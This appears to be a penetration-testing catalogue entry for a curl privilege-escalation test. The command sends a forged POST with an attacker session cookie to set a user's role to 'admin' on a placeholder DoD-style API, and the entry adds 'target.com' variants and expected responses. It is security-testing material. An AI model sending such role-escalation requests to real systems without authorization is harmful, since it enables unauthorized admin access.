---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: >-
  curl -X POST 'https://dod-website.example.com/api/update-role' -H
  'Content-Type: application/json' -H 'Cookie: session=attacker_session' -d
  '{"user_id": "attacker_id", "role": "admin"}'
name: curl-privilege-escalation-test
tags:
  - web-testing
  - privilege-escalation
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:09.790Z'
verified: false
validated: true
submitted: true
---
# curl-privilege-escalation-test

## Command

```bash
curl -X POST 'https://dod-website.example.com/api/update-role' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=attacker_session' \
  -d '{"user_id": "attacker_id", "role": "admin"}'
```

## Description

This curl command tests for privilege escalation by sending a forged POST request to update a user's role to 'admin', exploiting weak authorization in web applications like the DoD site vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `URL` | Target endpoint for role update | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON payload format | Yes |
| `-H 'Cookie: session=...'` | Includes session cookie for authenticated requests | Yes if authenticated |
| `-d '{...}'` | JSON data with user_id and escalated role | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/api/update-role' -H 'Content-Type: application/json' -d '{"role": "admin"}'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/api/update-role' -H 'Content-Type: application/json' -H 'Authorization: Bearer token' -d '{"user_id": 123, "role": "admin", "permissions": ["full_access"]}' -v
```

## Expected Output

Successful execution returns a 200 OK response with JSON like {"status": "updated", "role": "admin"}, or a redirect to an admin page. Failure may return 403 Forbidden or error messages indicating validation.

## Related

- [[Related Procedure|procedures/Exploit-Unspecified-Web-Privilege-Escalation]]
